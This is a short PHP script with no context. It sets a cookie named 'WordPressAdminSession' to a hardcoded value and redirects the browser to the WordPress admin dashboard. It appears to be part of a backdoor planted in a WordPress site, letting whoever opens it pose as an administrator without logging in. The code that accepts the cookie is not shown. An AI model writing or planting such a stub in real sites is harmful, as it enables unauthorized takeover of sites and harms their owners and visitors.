<?php 
 $admin_cookie_code="5434231426";
 setcookie("WordPressAdminSession",$admin_cookie_code,0,"/");
 header("Location: ../wp-admin/index.php");